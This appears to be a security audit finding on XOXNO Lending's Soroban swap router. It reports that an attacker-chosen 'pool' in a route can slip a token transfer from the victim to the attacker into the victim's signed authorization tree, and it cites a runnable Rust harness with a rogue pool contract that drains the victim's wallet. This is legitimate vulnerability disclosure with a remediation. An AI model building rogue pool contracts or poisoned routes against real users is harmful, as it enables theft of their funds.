### Title
Arbitrary contract invocation via attacker-controlled route payload lets an unprivileged route author inject a `token.transfer(victim, attacker, …)` under the victim's authorization tree — (`File: contracts/swap-aggregator/src/program.rs`)

### Summary
The command-injection class (attacker-supplied input reaching a privileged execution context) maps onto XOXNO Lending's swap route format: the `StrategyPayload.assets` registry is a list of attacker-chosen addresses, the packed `ops` program names a hop `pool` by index into that registry, and the router invokes whatever contract sits there with no allowlist. A malicious "pool" contract on the call stack can issue a `token::transfer(victim, attacker, amount)` that the Soroban host records as a child of the victim's signed authorization for `execute_strategy` (or for a controller strategy verb such as `swap_collateral`/`swap_debt`/`repay_debt_with_collateral`/`multiply`/`flash_position` that embeds the route). When the victim signs the simulated tree, the rogue transfer executes and drains tokens the protocol never touched. This is confirmed by the threat model and a dedicated harness test. [1](#0-0) [2](#0-1) 

### Finding Description
`execute_strategy` decodes caller-supplied `swap_xdr` into `StrategyPayload { amounts, assets, ops }` and dispatches each instruction to the venue address taken from `assets` (`idx_a` for swaps). [3](#0-2) [4](#0-3)  Per the threat model, "the router calls the pool and token addresses its payload names and keeps no allowlist of them, so a route can put third-party code on the call stack below the caller's authorization." [5](#0-4)  The harness test demonstrates the mechanism end-to-end: a `RogueHopPool::swap` invoked by the router calls `token.transfer(alice, attacker, WALLET_BALANCE)`; in recording mode the host attaches that transfer to Alice's `swap_collateral` auth entry, and in enforcing mode the transfer executes once Alice signs the simulated tree. [6](#0-5) [7](#0-6)  The controller side forwards user-supplied `StrategySwap` bytes verbatim to the router inside the flash guard, so the same injection reaches `swap_collateral`, `swap_debt`, `repay_debt_with_collateral`, `multiply`, and `flash_position`. [8](#0-7) 

### Impact Explanation
Theft of user funds: the rogue contract can move any token the victim holds — including tokens the lending protocol never listed — up to the amounts present in the signed auth tree. Neither the payload `min_out` check nor the controller's post-swap risk gate bounds the loss, because the stolen transfer is not part of the measured swap input/output. [9](#0-8) [10](#0-9)  Severity: High — the loss is the victim's entire wallet balance of the targeted token, demonstrated to execute under a signed tree in enforcing mode. [11](#0-10) 

### Likelihood Explanation
An unprivileged attacker needs only to get a victim to sign a poisoned route (e.g., a malicious quote server, phishing frontend, or tampered `routeXdr`). Simulation records the rogue transfer silently as a child auth entry; a wallet that auto-signs simulated auth trees produces the poisoned tree without explicit user review. The attack requires no privileged role, no leaked key, and no protocol misconfiguration — only the documented absence of a venue/token allowlist in the router. [1](#0-0)  The residual and min-out checks that do exist (`ExcessiveResidual`, `SlippageExceeded`, `RouterOverspend`, `NoSwapOutput`) all measure only the router's own token deltas and cannot observe a transfer authored under the victim's entry. [12](#0-11) 

### Recommendation
Restrict which contracts a route can put on the call stack:
- Enforce an on-chain venue/pool allowlist in `dispatch_hop`/`Program::decode` (or bind pools to a verified registry keyed by token pair), so `assets[idx_a]` must be a recognized pool rather than an arbitrary address.
- Alternatively, require each hop's pool and token addresses to be derived from protocol-known storage rather than free-form payload indices.
- Until an allowlist exists, the mitigation is client-side: decode `routeXdr` and reject any authorization tree with children beyond the single expected `token_in.transfer` — as the threat model already instructs. [13](#0-12) 

### Proof of Concept
The committed harness test is a runnable PoC:

1. Deploy `RogueHopPool` whose `swap` calls `token::transfer(victim, wallet_token, attacker, WALLET_BALANCE)` — `tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs:62-72`.
2. Deploy `UnlistedPoolRouter` (or use the real router, which also keeps no allowlist) that pulls `token_in`, invokes the payload-named `hop_pool`, and returns `min_out` — lines 39–47.
3. Build a `StrategySwap` whose `assets` registry includes the rogue pool address and whose ops route a hop through it; submit via `swap_collateral(alice, account, USDC, amount, ETH, route)` — lines 111–145.
4. Simulation records the rogue `transfer(alice → attacker)` as a child of Alice's `swap_collateral` auth entry; after Alice signs, the transfer executes: `assert_eq!(s.wallet(&s.alice), 0); assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);` — lines 206–227, 258–268. [14](#0-13)

### Citations

**File:** docs/explanation/threat-model.md (L154-165)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
user.
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L62-72)
```rust
    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
    }
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-268)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}

#[test]
fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```

**File:** contracts/swap-aggregator/src/lib.rs (L250-255)
```rust
    fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        renew_instance(&env);
        let payload = StrategyPayload::from_xdr(&env, &swap_xdr)
            .unwrap_or_else(|_| panic_with_error!(&env, Error::InvalidRouteXdr));
        execute::run(env, sender, total_in, payload)
    }
```

**File:** skills/xoxno-swap-aggregator/payload.md (L60-67)
```markdown
| Byte | Field | Swap (`opcode 0..=4`) | Burn (`5`) | Mint (`6`) |
|---|---|---|---|---|
| `[0]` | `opcode` | `0` Soroswap, `1` Aquarius (the encoder also maps Aquarius CLMM pools here), `2` Phoenix, `3` Sushi, `4` CometDex | Aquarius withdraw | Aquarius deposit |
| `[1]` | `mode` | any | must be `All` (`0`) | must be `All` (`0`) |
| `[2]` | `idx_a` | pool → `assets` | pool | pool |
| `[3]` | `idx_b` | `token_in` → `assets` | share token → `assets` | share token → `assets` |
| `[4]` | `idx_c` | `token_out` → `assets` (≠ `idx_b`) | first index of the per-constituent floor run in `amounts` | index of `mint_min_shares` in `amounts` |

```

**File:** skills/xoxno-swap-aggregator/payload.md (L100-105)
```markdown
7. Instruction loop. Swap: resolve the input by mode (`InvalidAmount` if `<= 0`), `vault.withdraw`, `venues::dispatch_hop` — measures the router's own `token_in`/`token_out` balances around the venue call; received `<= 0` → `ZeroOutput = 7`; spent `!= amount_in` → `InvalidAmount` — then `vault.deposit(token_out, received)`. Burn: reads Aquarius pool tokens and share id, validates the full constituent-floor span, withdraws the vault's whole share-token balance, checks each receipt against its floor (`MinAmountsNotMet = 28`), and deposits every constituent. Mint: reads and validates Aquarius metadata, deposits the vault's constituent balances, and requires `mint_min_shares > 0` and `shares >= mint_min_shares` (`MinSharesNotMet = 27`).
8. When the fee was not on input: `apply_fees_on_token(token_out)`.
9. **Min-out check:** `total_out = vault.balance_of(token_out)`; `total_out < amounts[min_out]` → `SlippageExceeded = 5`.
10. `vault.withdraw(token_out, total_out)` and `token_out.transfer(router → sender, total_out)`.
11. **Residual rule** (`execute/residual.rs`): every remaining vault balance is accrued to the admin fee bucket, but only up to `residual_allowance(credited) = max(credited / 1_000_000, 1_000)` per token (`constants.rs`), where `credited` is that token's lifetime deposits in this call. A larger leftover → `ExcessiveResidual = 29` and the whole call reverts. Unspent input is never refunded to the sender; size `total_in` to what the route consumes.
12. Return `total_out` (`i128`).
```

**File:** contracts/controller/src/strategies/swap.rs (L34-38)
```rust
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/controller/src/strategies/swap.rs (L40-54)
```rust
    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```
